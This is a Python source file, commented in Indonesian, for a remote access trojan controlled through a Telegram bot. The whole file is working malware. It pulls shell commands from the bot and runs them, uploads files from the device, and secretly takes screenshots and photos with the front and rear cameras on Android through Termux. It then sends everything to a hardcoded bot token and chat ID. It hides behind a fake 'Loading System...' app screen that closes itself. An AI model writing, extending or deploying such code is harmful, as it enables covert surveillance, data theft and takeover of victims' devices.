import requests
import subprocess
import time
import os
import platform

# ========== GANTI PUNYA LU ==========
BOT_TOKEN = "8730081478:AAHtnvpwwVTg1AbzexEB_MT0mfyhtJnKRQE"  # GANTI
CHAT_ID = "7682110036"  # GANTI
# ====================================

class RAT:
    def __init__(self):
        self.token = BOT_TOKEN
        self.chat_id = CHAT_ID
        self.api = f"https://api.telegram.org/bot{self.token}"
        self.last_id = 0
        self.running = True
        self.connected = False
        
    def send_msg(self, text):
        try:
            url = f"{self.api}/sendMessage"
            data = {'chat_id': self.chat_id, 'text': text}
            requests.post(url, data=data, timeout=10)
            return True
        except:
            return False

    def send_file(self, path):
        try:
            url = f"{self.api}/sendDocument"
            files = {'document': open(path, 'rb')}
            data = {'chat_id': self.chat_id}
            requests.post(url, files=files, data=data, timeout=30)
            return True
        except:
            return False

    def send_photo(self, path):
        try:
            url = f"{self.api}/sendPhoto"
            files = {'photo': open(path, 'rb')}
            data = {'chat_id': self.chat_id}
            requests.post(url, files=files, data=data, timeout=30)
            return True
        except:
            return False

    def get_cmd(self):
        try:
            url = f"{self.api}/getUpdates"
            params = {'offset': self.last_id + 1, 'timeout': 20}
            res = requests.get(url, params=params, timeout=25)
            if res.status_code == 200:
                updates = res.json().get('result', [])
                for upd in updates:
                    self.last_id = upd['update_id']
                    msg = upd.get('message', {})
                    if 'text' in msg:
                        return msg['text'].strip()
        except:
            pass
        return None

    def take_screenshot(self):
        try:
            self.send_msg("[*] Mengambil screenshot...")
            
            if os.path.exists("/sdcard/ss_tmp.png"):
                os.remove("/sdcard/ss_tmp.png")
            
            os.system("termux-screenshot /sdcard/ss_tmp.png 2>&1")
            time.sleep(3)
            
            if os.path.exists("/sdcard/ss_tmp.png"):
                size = os.path.getsize("/sdcard/ss_tmp.png")
                if size > 0:
                    self.send_msg(f"[*] Ukuran: {size} bytes, mengirim...")
                    self.send_file("/sdcard/ss_tmp.png")
                    os.remove("/sdcard/ss_tmp.png")
                    return "[+] Screenshot BERHASIL! ✅"
            
            os.system("screencap -p /sdcard/ss_tmp.png 2>&1")
            time.sleep(3)
            
            if os.path.exists("/sdcard/ss_tmp.png"):
                size = os.path.getsize("/sdcard/ss_tmp.png")
                if size > 0:
                    self.send_msg(f"[*] Ukuran: {size} bytes, mengirim...")
                    self.send_file("/sdcard/ss_tmp.png")
                    os.remove("/sdcard/ss_tmp.png")
                    return "[+] Screenshot BERHASIL! ✅"
            
            return "[-] Gagal screenshot. Pastikan termux-setup-storage sudah dijalankan."
            
        except Exception as e:
            return f"[-] Error screenshot: {str(e)}"

    def take_photo(self):
        try:
            self.send_msg("[*] Membuka kamera...")
            
            if os.path.exists("/sdcard/photo_tmp.jpg"):
                os.remove("/sdcard/photo_tmp.jpg")
            
            os.system("termux-camera-photo -c 0 /sdcard/photo_tmp.jpg 2>&1")
            time.sleep(4)
            
            if os.path.exists("/sdcard/photo_tmp.jpg"):
                size = os.path.getsize("/sdcard/photo_tmp.jpg")
                if size > 0:
                    self.send_msg(f"[*] Ukuran: {size} bytes, mengirim...")
                    self.send_photo("/sdcard/photo_tmp.jpg")
                    os.remove("/sdcard/photo_tmp.jpg")
                    return "[+] Foto BERHASIL! ✅"
            
            os.system("termux-camera-photo -c 1 /sdcard/photo_tmp.jpg 2>&1")
            time.sleep(4)
            
            if os.path.exists("/sdcard/photo_tmp.jpg"):
                size = os.path.getsize("/sdcard/photo_tmp.jpg")
                if size > 0:
                    self.send_msg(f"[*] Ukuran: {size} bytes, mengirim...")
                    self.send_photo("/sdcard/photo_tmp.jpg")
                    os.remove("/sdcard/photo_tmp.jpg")
                    return "[+] Foto BERHASIL (kamera depan)! ✅"
            
            return "[-] Gagal foto. Pastikan:\n1. pkg install termux-api\n2. Izin kamera diberikan"
            
        except Exception as e:
            return f"[-] Error foto: {str(e)}"

    def exec(self, cmd):
        try:
            if cmd == 'exit':
                self.running = False
                return "[+] RAT dimatikan"
            
            if cmd in ['screenshot', 'ss']:
                return self.take_screenshot()
            
            if cmd in ['photo', 'foto', 'camera']:
                return self.take_photo()
            
            if cmd.startswith('upload '):
                path = cmd[7:].strip()
                if os.path.exists(path):
                    self.send_file(path)
                    return f"[+] {path} terkirim!"
                return f"[-] {path} tidak ditemukan"
            
            if cmd == 'info':
                return self.get_info()
            
            if cmd.startswith('cd '):
                try:
                    os.chdir(cmd[3:])
                    return f"[+] Pindah ke: {os.getcwd()}"
                except:
                    return f"[-] Gagal pindah"
            
            if cmd in ['ls', 'dir']:
                files = os.listdir('.')
                return "\n".join(files) if files else "[+] Kosong"
            
            result = subprocess.run(cmd, shell=True, 
                                   capture_output=True, text=True, timeout=30)
            output = result.stdout + result.stderr
            return output if output.strip() else "[+] Selesai"
            
        except subprocess.TimeoutExpired:
            return "[-] Timeout (30 detik)"
        except Exception as e:
            return f"[-] Error: {str(e)}"

    def get_info(self):
        return f"""
[+] HOSTNAME: {platform.node()}
[+] OS: {platform.system()} {platform.release()}
[+] ARCH: {platform.machine()}
[+] USER: {os.getlogin() if hasattr(os, 'getlogin') else 'unknown'}
[+] DIR: {os.getcwd()}
[+] PYTHON: {platform.python_version()}
        """.strip()

    def connect(self):
        if self.send_msg("[+] RAT Mencoba Koneksi..."):
            if self.send_msg(self.get_info()):
                self.connected = True
                self.send_msg("[+] RAT Connected! Siap menerima perintah.")
                return True
        self.connected = False
        return False

    def run(self):
        while self.running:
            if not self.connected:
                if not self.connect():
                    time.sleep(30)
                    continue
            
            try:
                cmd = self.get_cmd()
                if cmd:
                    self.send_msg(f"[>] {cmd}")
                    output = self.exec(cmd)
                    if len(output) > 4000:
                        output = output[:4000] + "\n...truncated"
                    self.send_msg(output)
                time.sleep(3)
            except Exception as e:
                self.connected = False
                self.send_msg(f"[-] Error: {str(e)}")
                time.sleep(30)

from kivy.app import App
from kivy.uix.label import Label
from kivy.uix.boxlayout import BoxLayout
import threading

class RATApp(App):
    def build(self):
        layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        label = Label(text="Loading System...", font_size=30)
        layout.add_widget(label)
        
        threading.Thread(target=self.start_rat, daemon=True).start()
        threading.Thread(target=self.auto_close, daemon=True).start()
        
        return layout
    
    def auto_close(self):
        time.sleep(3)
        self.stop()
        os._exit(0)
    
    def start_rat(self):
        rat = RAT()
        rat.run()

if __name__ == "__main__":
    RATApp().run()
